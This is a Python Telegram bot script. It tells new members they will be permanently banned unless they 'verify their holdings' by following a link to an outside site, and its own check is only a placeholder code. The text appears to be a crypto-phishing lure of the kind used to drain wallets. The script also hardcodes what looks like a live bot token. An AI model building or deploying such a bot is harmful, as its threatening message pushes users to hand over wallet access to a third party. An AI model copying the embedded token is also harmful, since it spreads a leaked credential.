import telegram
from telegram.ext import Updater, CommandHandler, MessageHandler

# Global dictionary to store verification status for users (replace with a database in production).
verified_users = {}

def start(update, context):
    user_id = update.message.from_user.id
    if user_id in verified_users:
        update.message.reply_text("Completed✔️")
    else:
        update.message.reply_text("We have set up extra security steps🔒 to combat alternate accounts, spammers and raiders. If our system can verify your holdings you will be free to engage in the Official Telegram. should your account fail to verify, you  will be permanently banned 🛑. /verify")

def verify(update, context):
    user_id = update.message.from_user.id
    if user_id in verified_users:
        update.message.reply_text("Completed✔️")
    else:
        # Generate a verification code (replace with your logic).
        verification_code = ""
        update.message.reply_text(f"Please follow the link and verify : https://wallstreetmemes.club/ {verification_code}")

def check_verification(update, context):
    user_id = update.message.from_user.id
    user_input = update.message.text
    if user_id in verified_users:
        update.message.reply_text("Completed✔️")
    elif user_input == "12345":  # Replace with your verification logic.
        verified_users[user_id] = True
        update.message.reply_text("Verification successful! You now have access.")
    else:
        update.message.reply_text("Verification failed. Please try again or use /verify to start over.")

def main():
    bot = telegram.Bot(token='6195804969:AAEHz84-YyKlGUJg14Qgy242wPTe9Y1P7H8')  # Create a bot instance
    updater = Updater(bot=bot, use_context=True)  # Pass the bot instance to the Updater
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CommandHandler('verify', verify))
    dispatcher.add_handler(MessageHandler(None, check_verification))  # Remove the Filters

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
